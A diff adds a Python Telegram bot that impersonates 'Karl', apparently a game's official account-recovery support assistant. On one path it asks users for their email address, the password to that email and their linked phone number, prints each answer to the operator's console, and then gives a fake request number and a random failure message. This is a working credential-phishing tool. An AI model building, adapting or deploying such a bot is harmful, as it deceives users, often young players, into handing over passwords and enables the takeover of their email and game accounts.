@@ -1,0 +1,112 @@
+import telebot
+import random
+import time
+
+bot = telebot.TeleBot('Token')
+
+@bot.message_handler(commands=['start'])
+def start(message):
+    keyboard = telebot.types.ReplyKeyboardMarkup(True, selective=False)
+    keyboard.row('У меня проблема')
+    bot.send_message(message.chat.id, text='Нажми кнопку в меню', reply_markup=keyboard)
+    bot.register_next_step_handler(message, step1)
+    telebot.types.ReplyKeyboardRemove(True)
+
+
+@bot.message_handler(content_types=['text'])
+def step1(message):
+    chose = telebot.types.ReplyKeyboardMarkup(True, one_time_keyboard=True)
+    chose.add(telebot.types.InlineKeyboardButton(text='Потеря учётной записи'))
+    chose.add(telebot.types.InlineKeyboardButton(text='Доступ к учётной записи'))
+    telebot.types.ReplyKeyboardRemove(True)
+
+    if message.text == 'У меня проблема':
+        bot.send_message(message.chat.id, text='Какая у вас проблема?', reply_markup=chose)
+        bot.register_next_step_handler(message, step2);
+        telebot.types.ReplyKeyboardRemove(True)
+        print('У меня проблема')
+    elif message.text == 'Закрыть':
+        bot.send_message(message.chat.id, text='Какая у вас проблема?', reply_markup=chose)
+        bot.register_next_step_handler(message, step2);
+        telebot.types.ReplyKeyboardRemove(True)
+        print('Закрыть')
+
+def step2(message):
+    if message.text == 'Доступ к учётной записи':
+        bot.send_message(message.from_user.id, "Привет! Это я, Карл! Я здесь, чтобы вы могли вернуть утерянную учетную запись без помощи человека. Класс! Я понимаю не все человеческие слова, поэтому прошу вас четко отвечать только на заданный вопрос. Вопрос 1. Какой адрес электронной почты был использован при регистрации учетной записи?");
+        bot.register_next_step_handler(message, get_mail);
+        print('Доступ к учётной записи')
+    elif message.text == 'Потеря учётной записи':
+        bot.send_message(message.from_user.id, "Привет! Это я, Карл! Я здесь, чтобы вы могли вернуть утерянную учетную запись без помощи человека. Класс! Я понимаю не все человеческие слова, поэтому прошу вас четко отвечать только на заданный вопрос. Вопрос 1. Какой ID игрока был в утерянной учетной записи? Пример: #ABCD1234. ID игрока можно посмотреть в профиле или на вкладке друзей.");
+        bot.register_next_step_handler(message, get_id);
+        print('Потеря учётной записи')
+    else:
+        bot.send_message(message.from_user.id, "Некорректное действие!")
+        bot.register_next_step_handler(message, step1);
+        print("Некорректное действие!")
+
+def get_id(message):
+    user_info = {}
+    user_info['id'] = message.text
+    bot.send_message(message.from_user.id, 'Отлично! Вопрос 2. Какое имя использовано в утерянной учетной записи?');
+    bot.register_next_step_handler(message, get_name);
+    print(user_info)
+
+def get_name(message):
+    user_info = {}
+    user_info['name'] = message.text
+    bot.send_message(message.from_user.id, 'Отличное имя! Вопрос 3. Сколько трофеев было в утерянной учетной записи? Укажите примерное количество (0–60 000).');
+    bot.register_next_step_handler(message, get_age);
+    print(user_info)
+
+def get_age(message):
+    user_info = {}
+    user_info['age'] = message.text
+    bot.send_message(message.from_user.id, 'Замечательно, спасибо! Вопрос 4. В каком клубе вы состояли (если состояли)?');
+    bot.register_next_step_handler(message, get_club);
+    print(user_info)
+
+def get_club(message):
+    close = telebot.types.ReplyKeyboardMarkup(True, one_time_keyboard=True)
+    close.add(telebot.types.InlineKeyboardButton(text='Закрыть'))
+    user_info = {}
+    user_info['club'] = message.text
+    bot.send_message(message.from_user.id, text='Спасибо за информацию. К сожалению, ее оказалось недостаточно для восстановления вашей учетной записи. Вот несколько советов, которые могут помочь: Не обращайтесь к нам за помощью.', reply_markup=close);
+    telebot.types.ReplyKeyboardRemove(True)
+    bot.register_next_step_handler(message, step1);
+    print(user_info)
+
+def get_mail(message):
+    user_info = {}
+    user_info['mail'] = message.text
+    bot.send_message(message.chat.id, 'Отлично! Вопрос 2. Какой пароль использовался для электронной почты?')
+    bot.register_next_step_handler(message, get_password);
+    print(user_info)
+
+def get_password(message):
+    user_info = {}
+    user_info['password'] = message.text
+    bot.send_message(message.chat.id, 'Отличный пароль! Вопрос 3. Какой номер телефона был привязан к электронной почте?')
+    bot.register_next_step_handler(message, get_number);
+    print(user_info)
+
+def get_number(message):
+    close = telebot.types.ReplyKeyboardMarkup(True, one_time_keyboard=True)
+    close.add(telebot.types.InlineKeyboardButton(text='Закрыть'))
+    user_info = {}
+    user_info['number'] = message.text
+    print(user_info)
+    bot.send_message(message.chat.id, 'Хорошо. Мы рассмотрим вашу заявку на востановление аккаунта в скором времени. Номер вашей заявки №'+ str(random.randint(1111, 9999)) +'.')
+    time.sleep(10)
+    generate = random.randint(0, 1)
+    if generate == 0:
+        bot.send_message(message.chat.id, text='Произошла ошибка, попробуйте повторить познее.', reply_markup=close)
+        telebot.types.ReplyKeyboardRemove(True)
+    else:
+        bot.send_message(message.chat.id, text='Спасибо за информацию. К сожалению, ее оказалось недостаточно для восстановления вашей учетной записи.', reply_markup=close)
+        telebot.types.ReplyKeyboardRemove(True)
+    bot.register_next_step_handler(message, step1);
+    print(generate)
+
+
+bot.polling(none_stop=True)
